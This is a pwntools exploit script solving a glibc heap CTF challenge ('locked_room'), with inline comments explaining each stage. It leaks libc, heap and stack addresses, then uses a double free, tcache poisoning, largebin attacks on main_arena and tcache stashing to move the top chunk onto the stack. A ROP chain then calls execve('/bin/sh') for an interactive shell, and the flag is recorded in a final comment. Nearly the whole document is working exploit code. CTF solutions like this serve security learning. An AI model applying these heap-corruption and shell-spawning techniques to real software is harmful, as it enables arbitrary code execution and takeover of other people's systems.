#!/usr/bin/python3
from pwn import *

e = context.binary = ELF('./locked_room_patched')
libc = ELF('./libc.so', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
if args.REMOTE:
    ip, port = "dicec.tf", 32019
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

send_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())
protect = lambda p, addr: p ^ (addr >> 12)

current_index = 0
def malloc(size, data=None):
    if data is None:
        data = b"X"
    global current_index
    send_choice(1)
    p.sendlineafter(b"Size?\n> ", str(size).encode())
    p.sendafter(b"Data?\n> ", data)
    current_index += 1
    return current_index-1

def free(i):
    send_choice(2)
    p.sendlineafter(b"Index?\n> ", str(i).encode())

def view(i):
    send_choice(3)
    p.sendlineafter(b"Index?\n> ", str(i).encode())
    return p.recvuntil(b"1. Alloc\n", drop=True)

p = conn()

### 1. leaking libc and heap

# libc leak
uaf = malloc(0x800)
free(uaf)

i = malloc(0x800, b"A"*8)
malloc(8)

free(uaf)
libc_leak = u64(view(i))
log.info(f"libc leak: {hex(libc_leak)}")

libc.address = libc_leak - (libc.sym.main_arena+96)
log.info(f"libc: {hex(libc.address)}")

# heap leak
i = malloc(0x18, b"A"*8)
free(uaf)
heap_leak = u64(view(i))
log.info(f"heap leak: {hex(heap_leak)}")

heap = heap_leak << 12
log.info(f"heap: {hex(heap)}")

# cleanup
malloc(0x18)
malloc(0x7e8)

class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [0]*64
        self.pointers = [0]*64
    def set_count(self, size, count):
        idx = (size - 0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size - 0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=1):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        output = b""
        for count in self.counts:
            output += p16(count)
        for pointer in self.pointers:
            output += p64(pointer)
        return output

### 2. double free fastbin[0x20]

tcache1 = malloc(0x288, flat({0x278: 0x21}))
tcache2 = malloc(0x288)

tcache = [malloc(0x18) for _ in range(7)]
fast1 = malloc(0x18)
fast2 = malloc(0x18)

for i in tcache:
    free(i)

# free fastbin chunk next to top chunk
# so that av->top has PREV_FAST_FREED
free(fast2)

# allocate from top chunk to clear PREV_FAST_FREED
malloc(0x28)

# double free fast2
free(fast1)
free(fast2)

### 3. poison tcache[0x290] -> tcache_perthread_struct

for _ in range(7):
    malloc(0x18)

# corrupt fastbin[0x20]
malloc(0x18, p64(protect(heap + 0xd50, heap+0x1000)))

malloc(0x18)
malloc(0x18)

free(tcache1)
free(tcache2)

malloc(0x18, flat({0x08: 0x291, 0x10: protect(heap+0x10, heap+0xd50)}))

curr_heap = heap+0x1130
large1 = curr_heap+0xdd0
large2 = large1+0xf10

tcache = TcachePerthreadStruct()
tcache.set(0x100, large1)
tcache.set(0x110, large2)
tcache.set(0x290, heap+0x10)
malloc(0x288)
malloc(0x288, bytes(tcache))


### 4. setup future attacks

# 4a. setup fastbin fake size
chunk70 = []
for i in range(15):
    data = flat({0x58: 0x31}) if i == 6 else b"\x00"
    chunk70.append(malloc(0x68, data))


# 4b. setup largebin attack on av->system_mem
p2 = malloc(0x718)
malloc(0x18, flat(0, 0x101))

p1 = malloc(0x728)
malloc(0x18)


# setup largebin attack on main_arena+262 (smallbin[0xa0])
q2 = malloc(0x798)
malloc(0x18, flat(0, 0x111))

q1 = malloc(0x7a8)
malloc(0x18, flat(0, 0x51))    # fake size for corrupting next chunk

# 4c. setup 2 tcache staching attacks
small_av_top = []
small_leak_stack = []

small_av_top.append(malloc(0xa0, flat({0x98: 0x41})))
small_leak_stack.append(malloc(0x80))

for i in range(5):
    small_av_top.append(malloc(0xa0))
    small_leak_stack.append(malloc(0x80))
small_av_top.append(malloc(0xa0))
malloc(0x18)
small_av_top.append(malloc(0xa0))
malloc(0x18)    # pad

### 5. do largebin attack on av->system_mem

# this writes a heap address (address of corrupted largebin) to av->system_mem
free(p1)
malloc(0x738)

free(p2)

target = libc.sym.main_arena+2184
malloc(0xf8, p64(0) + p64(0x731) + p64(large1)*3 + p64(target-0x20))
malloc(0x738)


### 6. do largebin attack on main_arena (smallbin[0xa0])

# this is a misaligned write onto &smallbin[0xa0].bk - 2
# the upper 2 null bytes will overwrite the MSB of smallbin[0xa0].bk
# shrinking it enough to be a valid top chunk size later on
free(q1)
malloc(0x7b8)

free(q2)

target = libc.sym.main_arena+262
malloc(0x108, p64(0) + p64(0x7b1) + p64(large2)*3 + p64(target-0x20))
malloc(0x7b8)


tcache = TcachePerthreadStruct()
tcache.set(0x40, curr_heap+0x2560)
tcache.set_count(0x90, 7)      # fill tcache[0x90]
tcache.set(0x290, heap+0x10)
malloc(0x288, bytes(tcache))

### 7. tcache stashing to leak stack

# free to unsortedbin -> smallbin[0x90]
for i in reversed(range(len(small_leak_stack))):
    free(small_leak_stack[i])
malloc(0xc0)

malloc(0x38, flat(0, 0x91, curr_heap+0x26a0, libc.sym.__libc_argv - 0x18))

tcache = TcachePerthreadStruct()
tcache.set(0x50, curr_heap+0x24b0)
tcache.set_count(0xb0, 7)       # fill tcache[0xb0]
tcache.set(0x290, heap+0x10)
t = malloc(0x288, bytes(tcache))

malloc(0x80)

stack_leak = u64(view(t)[0xb8:0xc0])
log.info(f"stack_leak: {hex(stack_leak)}")

### 8. tcache stashing on av->top

# this writes a libc address (main_arena+256) to av->top
# this points to smallbin[0xa0], so smallbin[0xa0].bk (that we overwrote earlier)
# now acts as the top chunk's size

# free to unsortedbin -> smallbin[0xb0]
for i in reversed(range(len(small_av_top))):
    free(small_av_top[i])
malloc(0xc0)

target = libc.sym.main_arena+96     # main_arena->top
malloc(0x48, flat(0, 0xb1, curr_heap+0x2730, target - 0x10))

# empty tcache[0xb0]
tcache = TcachePerthreadStruct()
tcache.set(0x30, curr_heap+0x310)
tcache.set(0x290, heap+0x10)
t = malloc(0x288, bytes(tcache))

malloc(0xa0)

### 9. allocate using new av->top to fix the largebins

main_arena = b""
for i in range(0, 0x440, 0x10):
    main_arena += p64(libc.sym.main_arena + 256+i)*2
i = malloc(0x800, main_arena)

# check that the full overwrite has been done
# (when running this remotely, I initially had issues with this)
assert len(view(i)) == len(main_arena)

### 10. use fastbin[0x70] to store a fake size for tcache

# (this needs to be done late on to prevent largebin complications)
for i in chunk70:
    free(i)
malloc(0x28, flat(0, 0x71, protect(0x31, heap+0x1000)))

# empty tcache[0x70]
tcache = TcachePerthreadStruct()
tcache.set(0x30, libc.sym.main_arena+64)
t = malloc(0x288, bytes(tcache))

# write fake size to fastbin array
malloc(0x68)

### 11. allocate using fake size to overwrite av->top to the stack

# we use a PIE address located after the canary in alloc_chunk()
# this is a valid top chunk size as main_arena->system_mem is a heap address
# and thus is larger
target = stack_leak-0x180
malloc(0x28, p64(0)*4 + p64(target))

### 12. allocate on stack to get ROP

rop = ROP(libc)
rop.raw(0)  # rbp
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

# use a smallbin sized chunk to prevent triggering a malloc_consolidate()
# as we have invalid chunks in the fastbin array
malloc(0x300, b"A"*8 + rop.chain())

print(current_index)
p.interactive()
# dice{without_love..._'the_flag'_cannot_be_seen...!}